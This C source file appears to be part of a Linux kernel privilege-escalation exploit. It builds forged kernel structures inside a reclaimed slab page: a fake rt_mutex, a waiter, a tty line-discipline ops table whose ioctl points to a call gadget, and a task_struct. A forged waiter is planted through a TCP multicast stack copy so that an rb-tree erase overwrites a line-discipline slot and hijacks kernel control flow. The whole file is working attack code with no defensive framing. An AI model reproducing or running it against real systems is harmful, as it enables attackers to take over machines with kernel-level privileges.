#include "kara_reclaim_layout.h"

#include <stddef.h>
#include <string.h>

_Static_assert(KARA_MCAST_TO_WAITER == 0x30u,
               "kara TCP MCAST stack delta changed");
_Static_assert(KARA_MCAST_TO_WAITER + KARA_RT_WAITER_SIZE <=
                   KARA_MCAST_COPY_SIZE,
               "forged waiter must fit in group_source_req copy");
_Static_assert(KARA_FAKE_TASK_OFF + KARA_TASK_PI_BLOCKED_ON_OFF + 4u <=
                   KARA_MM_SLAB_SIZE,
               "fake task must fit in reclaimed order-1 page");

static void put32(uint8_t *buffer, size_t offset, uint32_t value)
{
    memcpy(buffer + offset, &value, sizeof(value));
}

void kara_fill_reclaim_page(uint8_t page[KARA_MM_SLAB_SIZE],
                            uint32_t page_base,
                            struct kara_reclaim_addresses *addresses)
{
    struct kara_reclaim_addresses local = {
        .fake_lock = page_base + KARA_FAKE_LOCK_OFF,
        .fake_waiter = page_base + KARA_FAKE_WAITER_OFF,
        .fake_ldisc = page_base + KARA_FAKE_LDISC_OFF,
        .fake_task = page_base + KARA_FAKE_TASK_OFF,
    };

    memset(page, 0, KARA_MM_SLAB_SIZE);

    /*
     * rt_mutex: unlocked wait_lock and one black/root waiter. Keep only the
     * HAS_WAITERS bit in owner so the PI walk exits immediately after the
     * rb-tree write instead of following a fabricated task_struct.
     */
    put32(page, KARA_FAKE_LOCK_OFF + 0x04, local.fake_waiter);
    put32(page, KARA_FAKE_LOCK_OFF + 0x08, local.fake_waiter);
    put32(page, KARA_FAKE_LOCK_OFF + 0x0c, 1u);

    /* Root waiter. Its lock back-reference satisfies rt_mutex_top_waiter(). */
    put32(page, KARA_FAKE_WAITER_OFF + 0x00, 1u);
    put32(page, KARA_FAKE_WAITER_OFF + 0x0c,
          local.fake_waiter + 0x0cu); /* detached pi_tree_entry */
    put32(page, KARA_FAKE_WAITER_OFF + 0x18, KARA_INIT_TASK);
    put32(page, KARA_FAKE_WAITER_OFF + 0x1c, local.fake_lock);
    put32(page, KARA_FAKE_WAITER_OFF + 0x20, 0u);

    /* tty_ldisc_ops: only num and ioctl are needed; owner remains NULL. */
    put32(page, KARA_FAKE_LDISC_OFF + 0x00, KARA_TTY_LDISC_MAGIC);
    put32(page, KARA_FAKE_LDISC_OFF + 0x08, KARA_LDISC_SLOT);
    put32(page, KARA_FAKE_LDISC_OFF + 0x24, KARA_LDISC_CALL_GADGET);

    /* Detached fake task used only as rt_mutex owner during chain exit. */
    put32(page, KARA_FAKE_TASK_OFF + 0x08, 0x100u);
    put32(page, KARA_FAKE_TASK_OFF + KARA_TASK_PRIO_OFF, 120u);
    put32(page, KARA_FAKE_TASK_OFF + KARA_TASK_STATIC_PRIO_OFF, 120u);
    put32(page, KARA_FAKE_TASK_OFF + KARA_TASK_NORMAL_PRIO_OFF, 120u);
    put32(page, KARA_FAKE_TASK_OFF + KARA_TASK_DEADLINE_OFF, 0u);
    put32(page, KARA_FAKE_TASK_OFF + KARA_TASK_DEADLINE_OFF + 4u, 0u);
    put32(page, KARA_FAKE_TASK_OFF + KARA_TASK_PI_LOCK_OFF, 0u);
    put32(page, KARA_FAKE_TASK_OFF + KARA_TASK_PI_WAITERS_OFF, 0u);
    put32(page, KARA_FAKE_TASK_OFF + KARA_TASK_PI_WAITERS_OFF + 4u, 0u);
    put32(page, KARA_FAKE_TASK_OFF + KARA_TASK_PI_BLOCKED_ON_OFF, 0u);

    if (addresses)
        *addresses = local;
}

void kara_build_forged_waiter(uint8_t waiter[KARA_RT_WAITER_SIZE],
                              const struct kara_reclaim_addresses *addresses)
{
    memset(waiter, 0, KARA_RT_WAITER_SIZE);

    /* rb_erase case 1 writes rb_left->__rb_parent_color = parent. */
    put32(waiter, 0x00, addresses->fake_ldisc);
    put32(waiter, 0x04, 0u);
    put32(waiter, 0x08, KARA_LDISC_TARGET);
    put32(waiter, 0x0c, addresses->fake_ldisc);
    put32(waiter, 0x10, 0u);
    put32(waiter, 0x14, KARA_LDISC_TARGET);
    put32(waiter, 0x18, KARA_INIT_TASK);
    put32(waiter, 0x1c, addresses->fake_lock);
    put32(waiter, 0x20, 0x7fffffffu);
}

void kara_build_tcp_stamp(uint8_t stamp[KARA_MCAST_COPY_SIZE],
                          const struct kara_reclaim_addresses *addresses)
{
    uint8_t waiter[KARA_RT_WAITER_SIZE];
    kara_build_forged_waiter(waiter, addresses);
    memset(stamp, 0, KARA_MCAST_COPY_SIZE);
    memcpy(stamp + KARA_MCAST_TO_WAITER, waiter, sizeof(waiter));
}
